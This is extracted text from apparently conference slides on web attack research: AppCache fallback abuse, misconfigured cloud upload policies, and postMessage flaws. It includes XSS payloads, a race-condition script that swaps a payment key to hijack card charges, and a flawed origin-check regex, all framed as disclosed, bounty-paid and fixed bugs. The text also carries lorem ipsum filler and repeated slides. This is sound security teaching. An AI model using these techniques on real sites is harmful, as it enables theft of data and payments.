##### Attacking Modern Web 

##### Technologies 

 Frans Rosén @fransrosen 

---

##### Attacking "Modern" Web 

##### Technologies 

 Frans Rosén @fransrosen 

---

# Modern = stuff people use 

 Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. 

---

 Author name her 

##### Frans Rosén 

 Frans Rosén @fransrosen 

- "The Swedish Ninja" 

- Security Advisor @detectify ( twitter: **@fransrosen** ) 

- HackerOne #7 @ /leaderboard/all-time 

- Blog at labs.detectify.com 

---

 Author name her 

##### Frans Rosén 

 Frans Rosén @fransrosen 

- Winner of MVH at H1-702 Live Hacking in Vegas! 

- Winner Team Sweden in San Francisco (Oath) 

- Best bug at H1-202 in Washington (Mapbox) 

- Best bug at H1-3120 in Amsterdam (Dropbox) 

---

##### Rundown 

AppCache 

- Bug in all browsers 

Upload Policies 

- Weak Implementations 

- Bypassing business logic 

Deep dive in postMessage implementations 

- The postMessage-tracker extension 

- Abusing sandboxed domains 

- Leaks, extraction, client-side race conditions 

 Frans Rosén @fransrosen 

---

##### Rundown 

 Frans Rosén @fransrosen 

#### Tool share! 

AppCache 

- Bug in all browsers 

Upload Policies 

- Weak Implementations 

- Bypassing business logic 

Deep dive in postMessage implementations 

- The postMessage-tracker extension 

- Abusing sandboxed domains 

- Leaks, extraction, client-side race conditions 

---

# AppCache – Not modern! 

 Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. 

---

 Author name her 

##### Disclaimer 

 Frans Rosén @fransrosen 

 https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=22 

Found independently by 

@filedescriptor 

Announced last AppSecEU 

---

 Author name her 

##### AppCache 

 Frans Rosén @fransrosen 

---

 Author name her 

##### AppCache 

 Frans Rosén @fransrosen 

---

 Author name her 

##### AppCache 

 Frans Rosén @fransrosen 

---

 Author name her 

##### Cookie Stuffing/Bombing 

 Frans Rosén @fransrosen 

Will	make	EVERY	page	return	500	Error	=	Manifest	FALLBACK	will	be	used 

---

 Author name her 

##### Bug in every browser 

 Frans Rosén @fransrosen 

Manifest	placed	in	/u/2241902/manifest.txt 

Would	use	the	FALLBACK	for	EVERYTHING,	even	outside	the	dir 

---

 Author name her 

##### Surprise – Specification was vague 

 Frans Rosén @fransrosen 

"To mitigate this, manifests can only specify 

fallbacks that are in the same path as the 

manifest itself." 

https://www.w3.org/TR/2015/WD-html51-20150506/browsers.html#concept-appcache-manifest-fallback 

---

 Author name her 

##### Surprise – Specification was vague 

 Frans Rosén @fransrosen 

"To mitigate this, manifests can only specify 

fallbacks that are in the same path as the 

manifest itself." 

https://www.w3.org/TR/2015/WD-html51-20150506/browsers.html#concept-appcache-manifest-fallback 

**This was confusing, could mean the path to the fallback-** 

**URL and that was what browsers thought. They missed:** 

"Fallback namespaces must also be in the same path as the manifest's URL." 

---

 Author name her 

##### AppCache demo 

 Frans Rosén @fransrosen 

---

---

 Author name her 

##### AppCache on Dropbox 

 Frans Rosén @fransrosen 

- Could run XML on dl.dropboxusercontent.com as HTML 

- XML installs manifest in browser on root 

- Any file downloaded from Dropbox would use the 

fallback XML-HTML page, which would log the current 

URL to an external logging site 

- Every secret link would be leaked to the attacker 

---

 Author name her 

##### AppCache on Dropbox 

 Frans Rosén @fransrosen 

- Could run XML on dl.dropboxusercontent.com as HTML 

- XML installs manifest in browser on root 

- Any file downloaded from Dropbox would use the 

fallback XML-HTML page, which would log the current 

URL to an external logging site 

- Every secret link would be leaked to the attacker 

### Bounty:	$12,845 

---

 Author name her 

##### Dropbox mitigations 

 Frans Rosén @fransrosen 

- No more XML-HTML on dl.dropboxusercontent.com 

- No more public directory for Dropbox users 

- Coordinated bug reporting to every browser 

- No more FALLBACK on root from path file 

- Argumented for faster deprecation of AppCache 

- Random subdomains for user-files 

---

 Author name her 

##### Dropbox mitigations 

 Frans Rosén @fransrosen 

- No more XML-HTML on dl.dropboxusercontent.com 

- No more public directory for Dropbox users 

- Coordinated bug reporting to every browser 

- No more FALLBACK on root from path file 

- Argumented for faster deprecation of AppCache 

- Random subdomains for user-files 

**Chrome Fixed Edge/IE Fixed** 

**Firefox Fixed Safari Fixed** 

https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40 

Reported 28 Feb 2017, fixed ~June 2017 

---

 Author name her 

##### Dropbox mitigations 

 Frans Rosén @fransrosen 

- No more XML-HTML on dl.dropboxusercontent.com 

- No more public directory for Dropbox users 

- Coordinated bug reporting to every browser 

- No more FALLBACK on root from path file 

- Argumented for faster deprecation of AppCache 

- Random subdomains for user-files 

**Chrome Fixed Edge/IE Fixed** 

**Firefox Fixed Safari Fixed** 

https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40 

Reported 28 Feb 2017, fixed ~June 2017 

### Browser	bounties:	$3000 

---

 Author name her 

##### AppCache vulns still possible 

 Frans Rosén @fransrosen 

Requirements: 

- HTTPS only (was changed recently) 

- Files uploaded can run HTML 

- Files could be on a isolated sandboxed domain 

- Files are uploaded to the same directory for all users 

---

 Author name her 

##### ServiceWorkers, big brother of AppCache 

 Frans Rosén @fransrosen 

Requirements: 

- HTTPS only 

- Files uploaded can run HTML 

- Files could be on a isolated sandboxed domain 

- Files are uploaded to the root path 

For example: bucket123.s3.amazonaws.com/test.html 

---

# Upload Policies 

# AWS and Google Cloud 

 Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. 

---

 Author name her 

##### Upload Policies 

 Frans Rosén @fransrosen 

A way to upload files directly to a bucket, without 

passing the company’s server first. 

" Faster upload 

" Secure (signed policy) 

---

 Author name her 

##### Upload Policies 

 Frans Rosén @fransrosen 

A way to upload files directly to a bucket, without 

passing the company’s server first. 

" Faster upload 

" Secure (signed policy) 

" Easy to do wrong! 

---

 Author name her 

##### Upload Policies 

 Frans Rosén @fransrosen 

Looks like this: 

---

 Author name her 

##### Upload Policies 

 Frans Rosén @fransrosen 

Policy is a signed base64 encoded JSON 

---

 Author name her 

##### Pitfalls AWS S3 

 Frans Rosén @fransrosen 

" **starts-with $key** does not contain anything 

We can replace any file in the bucket! 

---

 Author name her 

##### Pitfalls AWS S3 

 Frans Rosén @fransrosen 

" **starts-with $key** does not contain anything 

We can replace any file in the bucket! 

" **starts-with $key** does not contain path-separator 

We can place stuff in root, 

remember ServiceWorkers/AppCache? 

---

 Author name her 

##### Pitfalls AWS S3 

 Frans Rosén @fransrosen 

" **$Content-Type** uses empty **starts-with + content-disp**^ 

We can now upload HTML-files: 

**Content-type: text/html** 

---

 Author name her 

##### Pitfalls AWS S3 

 Frans Rosén @fransrosen 

" **$Content-Type** uses empty **starts-with + content-disp**^ 

We can now upload HTML-files: 

**Content-type: text/html** 

" **$Content-Type**^ uses^ **starts-with = image/jpeg**^ 

We can still upload HTML: 

**Content-type: image/jpegz;text/html** 

---

 Author name her 

##### Custom business logic (Google Cloud) 

 Frans Rosén @fransrosen 

 POST /user_uploads/signed_url/ HTTP/ 1.1 Host:	example.com Content-Type:	application/json;charset=UTF-8 

 {"file_name":"images/test.png","content_type":"image/png"} 

---

 Author name her 

##### Custom business logic (Google Cloud) 

 Frans Rosén @fransrosen 

 POST /user_uploads/signed_url/ HTTP/ 1.1 Host:	example.com Content-Type:	application/json;charset=UTF-8 

 {"file_name":"images/test.png","content_type":"image/png"} 

 {"signed_url":"https://storage.googleapis.com/uploads/images/test.png? Expires=1515198382&GoogleAccessId=example%40example.iam.gserviceaccount.com& Signature=dlMAFC2Gs22eP%2ByoAhwGqo0A0ijySYYtRdkaIHVUr%2FvwKfNSKkKwTTpBpyOF..."}	 

Signed	URL	back	to	upload	to: 

---

 Author name her 

##### Vulnerabilities 

 Frans Rosén @fransrosen 

" We can select what file to override 

---

 Author name her Frans Rosén @fransrosen 

" We can select what file to override 

" If signed URL allows viewing = read any file 

Just fetch the URL and we have the invoice 

 POST /user_uploads/signed_url/ HTTP/ 1.1 Host:	example.com Content-Type:	application/json;charset=UTF-8 

 {"file_name":"documents/invoice1.pdf","content_type":"application/pdf"} 

{"signed_url":"https://storage.googleapis.com/uploads/documents/invoice1.pdf? Expires=1515198382&GoogleAccessId=example%40example.iam.gserviceaccount.com& Signature=dlMAFC2Gs22eP%2ByoAhwGqo0A0ijySYYtRdkaIHVUr%2FvwKfNSKkKwTTpBpyOF..."}	 

##### Vulnerabilities 

---

 Author name her Frans Rosén @fransrosen 

" We can select what file to override 

" If signed URL allows viewing = read any file 

Just fetch the URL and we have the invoice 

 POST /user_uploads/signed_url/ HTTP/ 1.1 Host:	example.com Content-Type:	application/json;charset=UTF-8 

 {"file_name":"documents/invoice1.pdf","content_type":"application/pdf"} 

{"signed_url":"https://storage.googleapis.com/uploads/documents/invoice1.pdf? Expires=1515198382&GoogleAccessId=example%40example.iam.gserviceaccount.com& Signature=dlMAFC2Gs22eP%2ByoAhwGqo0A0ijySYYtRdkaIHVUr%2FvwKfNSKkKwTTpBpyOF..."}	 

### Total	bounties:	~$15,000 

##### Vulnerabilities 

---

# Rolling your own 

# policy logic sucks 

 Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. 

---

 Author name her Frans Rosén @fransrosen 

Goal is to reach the bucket-root, or another file 

##### Custom Policy Logic 

---

 Author name her Frans Rosén @fransrosen 

Back to the 90s! 

##### Path traversal with path normalization 

---

 Author name her Frans Rosén @fransrosen 

Back to the 90s! 

##### Path traversal with path normalization 

###### Full read access to every object + listing 

---

 Author name her Frans Rosén @fransrosen 

Expected: 

##### Regex extraction of URL-parts 

https://example-bucket.s3.amazonaws.com/dir/file.png 

Result: 

https://s3.amazonaws.com/example-bucket/dir/file.png?Signature.. 

---

 Author name her Frans Rosén @fransrosen 

Bypass: 

##### Regex extraction of URL-parts 

---

 Author name her Frans Rosén @fransrosen 

Bypass: 

##### Regex extraction of URL-parts 

---

 Author name her Frans Rosén @fransrosen 

Bypass: 

##### Regex extraction of URL-parts 

###### Full read access to every object + listing 

---

 Author name her Frans Rosén @fransrosen 

##### Temporary URLs with signed links 

---

 Author name her Frans Rosén @fransrosen 

##### Temporary URLs with signed links 

---

 Author name her Frans Rosén @fransrosen 

##### Temporary URLs with signed links 

##### https://secure.example.com/files/xx11 

---

 Author name her Frans Rosén @fransrosen 

##### Temporary URLs with signed links 

##### https://secure.example.com/files/xx11 

---

 Author name her Frans Rosén @fransrosen 

##### Temporary URLs with signed links 

#### https://secure.example.com/files/xx11 Full read access to every object 

---

 Author name her Frans Rosén @fransrosen 

##### Full access to every object 

---

 Author name her Frans Rosén @fransrosen 

##### Full access to every object 

---

# Deep dive in postMessage 

 Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. 

---

 Author name her 

##### Birth of the postMessage-tracker extension 

 Frans Rosén @fransrosen 

- 1 year ago, **discussion on last AppSecEU!** 

---

 Author name her 

##### Birth of the postMessage-tracker extension 

 Frans Rosén @fransrosen 

- Catch every listener in all frames. 

- Find the function receiving the message 

- Log all messages btw all frames 

---

 Author name her 

##### Birth of the postMessage-tracker extension 

 Frans Rosén @fransrosen 

- Catch every listener in all frames. 

- Find the function receiving the message 

- Log all messages btw all frames 

---

 Author name her 

##### What have I found? 

 Frans Rosén @fransrosen 

Regular vuln cases (XSS) 

---

 Author name her 

##### What have I found? 

 Frans Rosén @fransrosen 

Regular vuln cases (XSS) 

---

 Author name her 

##### What have I found? 

 Frans Rosén @fransrosen 

Regular vuln cases (XSS) 

---

 Author name her 

##### What have I found? 

 Frans Rosén @fransrosen 

Regular vuln cases (XSS) 

 if 	(e.data.JSloadScript)	{	 if 	(e.data.JSloadScript.type	 == "iframe")	{	 //	create	the	new	iframe	element	with	the	src	given	to	us	via	the	event 												local_create_element(doc,	['iframe',	'width',	'0',	'height',	'0',	'src',	 e.data.JSloadScript.value],	parent);	 										}	 else 	{	 												localLoadScript(e.data.JSloadScript.value)	 										}	 						} 

---

 Author name her 

##### What have I found? 

 Frans Rosén @fransrosen 

Regular vuln cases (XSS) 

 if 	(e.data.JSloadScript)	{	 if 	(e.data.JSloadScript.type	 == "iframe")	{	 //	create	the	new	iframe	element	with	the	src	given	to	us	via	the	event 												local_create_element(doc,	['iframe',	'width',	'0',	'height',	'0',	'src',	 e.data.JSloadScript.value],	parent);	 										}	 else 	{	 												localLoadScript(e.data.JSloadScript.value)	 										}	 						} 

 b.postMessage({"JSloadScript":{"value":"data:text/javascript,alert(document.domain)"}},'*')	 

---

 Author name her 

##### What have I found? 

 Frans Rosén @fransrosen 

Complex ones: Data-Extraction 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Listener: 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Vulnerable origin-check: 

---

 Author name her Frans Rosén @fransrosen 

Vulnerable origin-check: 

##### Data-Extraction 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Looks harmless? 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Initiating ruleset 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Action-Rules: 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Extraction-options! 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Trigger: 

 {	 "params":	{	 "testRules":	{	 "rules":	[	 																{	 "name":	"xxx",	 "triggers":	{	 "type":	"Delay",		 "delay":	 5000	 																				}		 																				...	 																}	 												]	 								}	 				}	 } 

---

 Author name her Frans Rosén @fransrosen 

State: 

 																				...	 "states":	{	 "type":	"JSVariableExists",		 "name":	"ClickTaleCookieDomain",		 "value":	"example.com" 																				},	 																				...	 

##### Data-Extraction 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Action: 

 				...	 "action":	{	 "actualType":	"CTEventAction",		 "type":	"TestRuleEvent",		 "dynamicEventName":	{	 "parts":	[	 																{	 "type":	"ElementValue",		 "ctSelector":	{	 "querySelector":	".content-wrapper	script" 																				}	 																},		 																{	 "type":	"CookieValue",		 "name":	"csrf_token" 																}	 												]	 								}	 				}	 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

Payload: 

---

 Author name her 

##### Data-Extraction 

 Frans Rosén @fransrosen 

CSRF-token! 

---

 Author name her 

##### XSS on isolated but "trusted" domain 

 Frans Rosén @fransrosen 

Sandboxed domain being trusted and not trusted at the same time. 

postMessage used to transfer data from/to trusted domain. 

---

 Author name her 

##### Document service 

 Frans Rosén @fransrosen 

**ACME.COM** 

Create	new	doc 

---

 Author name her 

##### XSS on sandbox 

 Frans Rosén @fransrosen 

**usersandbox.com** 

---

 Author name her 

##### User creates a document 

 Frans Rosén @fransrosen 

**ACME.COM** 

**usersandbox.com** 

Create	new	doc 

---

 Author name her 

##### Sandbox opens up in iframe for doc-converter 

 Frans Rosén @fransrosen 

**ACME.COM** 

**usersandbox.com** 

 usersandbox.com 

Create	new	doc 

---

 Author name her 

##### Hijack the iframe js, due to SOP 

 Frans Rosén @fransrosen 

**ACME.COM** 

**usersandbox.com** 

 usersandbox.com 

Create	new	doc 

---

 Author name her 

##### User uploads file, postMessage data to converter 

 Frans Rosén @fransrosen 

**usersandbox.com ACME.COM** 

 usersandbox.com 

---

 Author name her 

##### Iframe leaks data to attacker’s sandbox window 

 Frans Rosén @fransrosen 

**usersandbox.com ACME.COM** 

 usersandbox.com 

---

 Author name her 

##### And we have the document-data! 

 Frans Rosén @fransrosen 

---

 Author name her 

##### What have I found? 

 Frans Rosén @fransrosen 

Client-side Race Conditions! 

---

 Author name her 

##### Localized welcome screen, JS loaded w/ postMsg 

 Frans Rosén @fransrosen 

Loading... 

---

 Author name her Frans Rosén @fransrosen 

 mpel.com 

Welcome! 

Välkommen! 

Willkommen! 

 localeservice.com 

##### Localized welcome screen, JS loaded w/ postMsg 

---

 Author name her Frans Rosén @fransrosen 

Welcome! 

Välkommen! 

Willkommen! 

 link.com.example.com = OK localeservice.com 

##### Localized welcome screen, JS loaded w/ postMsg 

---

 Author name her 

##### Only works once 

 Frans Rosén @fransrosen 

Welcome! 

Välkommen! 

Willkommen! 

 localeservice.com 

---

 Author name her 

##### Only works once 

 Frans Rosén @fransrosen 

Welcome! 

Välkommen! 

Willkommen! 

 localeservice.com 

---

 Author name her 

##### Curr not escaped 

 Frans Rosén @fransrosen 

Welcome! 

Välkommen! 

Willkommen! 

---

 Author name her 

##### Loaded JS, osl vuln param 

 Frans Rosén @fransrosen 

 ...&curr=&osl='-alert(1)-' 

---

 Author name her 

##### alert was blocked. yawn... 

 Frans Rosén @fransrosen 

---

 Author name her 

##### alert was blocked. yawn... easy fix 

 Frans Rosén @fransrosen 

---

 Author name her 

##### Attacker-site 

 Frans Rosén @fransrosen 

**link.com.example.com** 

---

 Author name her 

##### Attacker site opens victim site 

 Frans Rosén @fransrosen 

 link.com.example.com 	Loading...							 

---

 setInterval( function ()	{	 if (b)	b.postMessage('{"sitelist":"www.example.com/ global","siteurl":"www.example.com/uk","curr":"curr=&osl=\'-(function() {document.body.appendChild(iframe=document.createElement(\'iframe\'));window .alert=iframe.contentWindow[\'alert\'];document.body.removeChild(iframe);win dow.alert(document.domain)})()-\'"}','*')	 				},	 10 ); 

 Author name her 

##### Loaded JS 

 Frans Rosén @fransrosen 

 link.com.example.com 	Loading...							 

---

 setInterval( function ()	{	 if (b)	b.postMessage('{"sitelist":"www.example.com/ global","siteurl":"www.example.com/uk","curr":"curr=&osl=\'-(function() {document.body.appendChild(iframe=document.createElement(\'iframe\'));window .alert=iframe.contentWindow[\'alert\'];document.body.removeChild(iframe);win dow.alert(document.domain)})()-\'"}','*')	 				},	 10 ); 

 Author name her 

##### Loaded JS 

 Frans Rosén @fransrosen 

**link.com.example.com** 

 Loads mpel.js... 

 	Loading...							 

---

 setInterval( function ()	{	 if (b)	b.postMessage('{"sitelist":"www.example.com/ global","siteurl":"www.example.com/uk","curr":"curr=&osl=\'-(function() {document.body.appendChild(iframe=document.createElement(\'iframe\'));window .alert=iframe.contentWindow[\'alert\'];document.body.removeChild(iframe);win dow.alert(document.domain)})()-\'"}','*')	 				},	 10 ); 

 Author name her 

##### Loaded JS 

 Frans Rosén @fransrosen 

**link.com.example.com** 

 Välkommen! 

 Willkommen! 

 Welcome!				 

 localeservice.com 

 Loads mpel.js... 

---

 setInterval( function ()	{	 if (b)	b.postMessage('{"sitelist":"www.example.com/ global","siteurl":"www.example.com/uk","curr":"curr=&osl=\'-(function() {document.body.appendChild(iframe=document.createElement(\'iframe\'));window .alert=iframe.contentWindow[\'alert\'];document.body.removeChild(iframe);win dow.alert(document.domain)})()-\'"}','*')	 				},	 10 ); 

 Author name her 

##### We won! 

 Frans Rosén @fransrosen 

**link.com.example.com** 

 Välkommen! 

 Willkommen! 

 Welcome!				 

 localeservice.com 

 Loads mpel.js... 

---

 Author name her 

##### Client-Side Race Condition 

 Frans Rosén @fransrosen 

postMessage between JS-load and iframe-load 

Worked in all browsers. 

---

 Author name her 

##### Client-Side Race Condition #2 

 Frans Rosén @fransrosen 

Multiple bugs incoming, hang on! 

---

 Author name her 

##### Can you find the bug(s)? 

 Frans Rosén @fransrosen 

 SecureCreditCardController.prototype.isValidOrigin	 = function 	(origin)	{	 if 	(origin	 === null || 	origin	 === undefined )	{	 return false ;	 				}	 var 	domains	 = 	[".example.com",	".example.to",	".example.at",	".example.ca",	 ".example.ch",	".example.be",	".example.de",	".example.es",	".example.fr",	".example.ie",	 ".example.it",	".example.nl",	".example.se",	".example.dk",	".example.no",	".example.fi",	 ".example.cz",	".example.pt",	".example.pl",	".example.cl",	".example.my",	".example.co.jp",	 ".example.co.nz",	".example.co.uk",	".example.com.au",	".example.com.br",	".example.com.ph",	 ".example.com.mx",	".example.com.sg",	".example.com.ar",	".example.com.tr",	 ".example.com.hk",	".example.com.tw"];	 var 	escapedDomains	 = 	$.map(domains,	 function 	(domain)	{	 return 	domain.replace('.',	'\\.');	 				});	 var 	exampleDomainsRE	 = '^https:\/\/.*(' + 	escapedDomains.join('|')	 + ')$';	 return Boolean(origin.match(exampleDomainsRE));	 }; 

---

 Author name her 

##### 1st bug! 

 Frans Rosén @fransrosen 

 SecureCreditCardController.prototype.isValidOrigin	 = function 	(origin)	{	 if 	(origin	 === null || 	origin	 === undefined )	{	 return false ;	 				}	 var 	domains	 = 	[".example.com",	".example.to",	".example.at",	".example.ca",	 ".example.ch",	".example.be",	".example.de",	".example.es",	".example.fr",	".example.ie",	 ".example.it",	".example.nl",	".example.se",	".example.dk",	".example.no",	".example.fi",	 ".example.cz",	".example.pt",	".example.pl",	".example.cl",	".example.my",	".example.co.jp",	 ".example.co.nz",	".example.co.uk",	".example.com.au",	".example.com.br",	".example.com.ph",	 ".example.com.mx",	".example.com.sg",	".example.com.ar",	".example.com.tr",	 ".example.com.hk",	".example.com.tw"];	 var 	escapedDomains	 = 	$.map(domains,	 function 	(domain)	{	 return 	domain.replace('.',	'\\.');	 				});	 var 	exampleDomainsRE	 = '^https:\/\/.*(' + 	escapedDomains.join('|')	 + ')$';	 return Boolean(origin.match(exampleDomainsRE));	 }; 

---

 Author name her 

##### 1st bug! 

 Frans Rosén @fransrosen 

".example.co.nz".replace('.',	'\\.')	 

"\.example.co.nz" 

---

 Author name her 

##### Can you find the next bug? 

 Frans Rosén @fransrosen 

 SecureCreditCardController.prototype.isValidOrigin	 = function 	(origin)	{	 if 	(origin	 === null || 	origin	 === undefined )	{	 return false ;	 				}	 var 	domains	 = 	[".example.com",	".example.to",	".example.at",	".example.ca",	 ".example.ch",	".example.be",	".example.de",	".example.es",	".example.fr",	".example.ie",	 ".example.it",	".example.nl",	".example.se",	".example.dk",	".example.no",	".example.fi",	 ".example.cz",	".example.pt",	".example.pl",	".example.cl",	".example.my",	".example.co.jp",	 ".example.co.nz",	".example.co.uk",	".example.com.au",	".example.com.br",	".example.com.ph",	 ".example.com.mx",	".example.com.sg",	".example.com.ar",	".example.com.tr",	 ".example.com.hk",	".example.com.tw"];	 var 	escapedDomains	 = 	$.map(domains,	 function 	(domain)	{	 return 	domain.replace('.',	'\\.');	 				});	 var 	exampleDomainsRE	 = '^https:\/\/.*(' + 	escapedDomains.join('|')	 + ')$';	 return Boolean(origin.match(exampleDomainsRE));	 }; 

---

 SecureCreditCardController.prototype.isValidOrigin	 = function 	(origin)	{	 if 	(origin	 === null || 	origin	 === undefined )	{	 return false ;	 				}	 var 	domains	 = 	[".example.com",	".example.to",	".example.at",	".example.ca",	 ".example.ch",	".example.be",	".example.de",	".example.es",	".example.fr",	".example.ie",	 ".example.it",	".example.nl",	".example.se",	".example.dk",	".example.no",	".example.fi",	 ".example.cz",	".example.pt",	".example.pl",	".example.cl",	".example.my",	".example.co.jp",	 ".example.co.nz",	".example.co.uk",	".example.com.au",	".example.com.br",	".example.com.ph",	 ".example.com.mx",	".example.com.sg",	".example.com.ar",	".example.com.tr",	 ".example.com.hk",	".example.com.tw"];	 var 	escapedDomains	 = 	$.map(domains,	 function 	(domain)	{	 return 	domain.replace('.',	'\\.');	 				});	 var 	exampleDomainsRE	 = '^https:\/\/.*(' + 	escapedDomains.join('|')	 + ')$';	 return Boolean(origin.match(exampleDomainsRE));	 }; 

 Author name her 

##### 2nd bug! 

 Frans Rosén @fransrosen 

---

 Author name her 

##### .nz is allowed since 2015! 

 Frans Rosén @fransrosen 

 https://en.wikipedia.org/wiki/.nz 

---

 Author name her 

##### 2nd bug! 

 Frans Rosén @fransrosen 

 Boolean("https://www.exampleaco.nz".match('^https:\/ \/.*(\.example.co.nz)$'))	 

**true** 

---

 Author name her 

##### 2nd bug! 

 Frans Rosén @fransrosen 

 Boolean("https://www.exampleaco.nz".match('^https:\/ \/.*(\.example.co.nz)$'))	 

**true** 

---

 Author name her 

##### Vulnerable scenario 

 Frans Rosén @fransrosen 

**ilikefood.com** 

Subscribe! 

---

 Author name her 

##### Opens PCI-certified domain for payment 

 Frans Rosén @fransrosen 

**ilikefood.com** 

Subscribe! 

 foodpayments.com 

---

 Author name her 

##### Iframe loaded, main frame sends INIT to iframe 

 Frans Rosén @fransrosen 

**ilikefood.com** 

Subscribe! 

iframe.postMessage('INIT',	'*') 

 foodpayments.com 

---

 Author name her 

##### Iframe registers the sender of INIT as msgTarget 

 Frans Rosén @fransrosen 

**ilikefood.com** 

Subscribe! 

iframe.postMessage('INIT',	'*') 

 if(e.data==INIT	&&	originOK)	{	 	msgTarget	=	event.source	 	msgTarget.postMessage('INIT','*')	 } 

 foodpayments.com 

---

 Author name her 

##### Iframe tells main all is OK 

 Frans Rosén @fransrosen 

**ilikefood.com** 

Subscribe! 

 foodpayments.com 

 if(e.data==INIT	and	e.source==iframe)	{	 		all_ok_dont_kill_frame()	 } 

msgTarget.postMessage('INIT','*') 

---

 Author name her 

##### Main window sends over provider data 

 Frans Rosén @fransrosen 

**ilikefood.com** 

Subscribe! 

 if(INIT)	{ 	iframe.postMessage('["LOAD",	 "stripe","pk_abc123"]}’,	'*')	 } 

 foodpayments.com 

---

 Author name her 

##### Iframe loads payment provider and kills channel 

 Frans Rosén @fransrosen 

**ilikefood.com** 

Subscribe! 

 if(INIT)	{	 if(e.data[0]==LOAD	&&	originOK)	{ 	initpayment(e.data[1],	e.data[2]) window.removeEventListener	 	('message',	listener) }	 } 

 foodpayments.com 

 if(INIT)	{ 	iframe.postMessage('["LOAD",	 "stripe","pk_abc123"]}’,	'*')	 } 

---

 Author name her 

##### Did you see it? 

 Frans Rosén @fransrosen 

---

 Author name her 

##### Open ilikefood.com from attacker 

 Frans Rosén @fransrosen 

**exampleaco.nz ilikefood.com** 

 Subscribe! 

---

 Author name her 

##### Victim clicks subscribe, iframe is loaded 

 Frans Rosén @fransrosen 

**ilikefood.com** 

 Subscribe! foodpayments.com 

**exampleaco.nz** 

---

 Author name her 

##### Attacker sprays out LOAD to iframe 

 Frans Rosén @fransrosen 

**ilikefood.com** 

 Subscribe! foodpayments.com 

**setInterval(function(){	** 

**		child.frames[0].postMessage('["LOAD","stripe","pk_diffkey"]}’,'*')** 

**},	100)** 

**exampleaco.nz** 

---

 Author name her 

##### INIT-dance resolves, but attacker wins with LOAD 

 Frans Rosén @fransrosen 

**ilikefood.com** 

 Subscribe! foodpayments.com 

**setInterval(function(){	** 

**		child.frames[0].postMessage('["LOAD","stripe","pk_diffkey"]}’,'*')** 

**},	100)** 

 'INIT'<->'INIT' exampleaco.nz 

---

 Author name her 

##### LOAD kills listener, we won the race! Stripe loads... 

 Frans Rosén @fransrosen 

**ilikefood.com** 

 Subscribe! foodpayments.com 

**exampleaco.nz** 

 Frame loads api.stripe.com?key=pk_diffkey... 

---

 Author name her 

##### It’s now the attacker’s Stripe account 

 Frans Rosén @fransrosen 

**ilikefood.com** 

 Subscribe! foodpayments.com 

 Enter	credit	card 

 Pay! 

**exampleaco.nz** 

---

 Author name her 

##### Payment will fail for site... 

 Frans Rosén @fransrosen 

 foodpayments.com 

 Payment	failed	:( 

---

 Author name her 

##### Payment will fail for site...but worked for Stripe! 

 Frans Rosén @fransrosen 

 foodpayments.com 

 Payment	failed	:( 

---

 Author name her 

##### From Stripe-logs we can charge the card anything! 

 Frans Rosén @fransrosen 

---

 Author name her 

##### From Stripe-logs we can charge the card anything! 

 Frans Rosén @fransrosen 

---

 Author name her 

##### Client-Side Race Condition #2 

 Frans Rosén @fransrosen 

postMessage from opener between two other postMessage-calls 

Chrome seems to be the only one allowing this to happen afaik. 

---

---

 Author name her 

##### postMessage-tracker Speedbumps 

 Frans Rosén @fransrosen 

---

 Author name her Frans Rosén @fransrosen 

- Problem 1: Function-wrapping, Raven.js, rollbar, bugsnag, NewRelic 

**Before:** 

##### postMessage-tracker Speedbumps 

---

 Author name her Frans Rosén @fransrosen 

- Problem 1: Function-wrapping, Raven.js, rollbar, bugsnag, NewRelic 

**Before: After:** 

Solution: Find wrapper and jump over it. console better due to this! 

##### postMessage-tracker Speedbumps 

---

 Author name her Frans Rosén @fransrosen 

- Problem 2: jQuery-wrapping, such a mess (diff btw version) 

**Before:** 

##### postMessage-tracker Speedbumps 

---

 Author name her Frans Rosén @fransrosen 

- Problem 2: jQuery-wrapping, such a mess (diff btw version) 

**Before: After:** 

Solution: Use either ._data, .expando or .events from jQuery object! 

##### postMessage-tracker Speedbumps 

---

 Author name her Frans Rosén @fransrosen 

- Problem 3: Anonymous functions. Could not identify them at all. 

**Before:** 

##### postMessage-tracker Speedbumps 

---

 Author name her Frans Rosén @fransrosen 

